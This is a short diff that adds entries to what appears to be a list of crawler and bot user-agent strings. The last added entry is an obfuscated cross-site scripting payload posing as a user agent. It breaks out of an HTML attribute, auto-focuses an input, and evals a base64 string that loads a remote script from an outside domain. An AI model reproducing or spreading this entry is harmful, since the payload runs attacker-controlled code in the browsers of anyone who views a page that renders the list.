@@ -1,0 +1,4 @@
+Dalvik/1.6.0 (Linux; U; Android 4.4.2; InFocus M320 Build/KOT49H)
+FocussedImageCrawler
+focusbot/1.1
+Z"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8venlxYS5nYS9hcSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
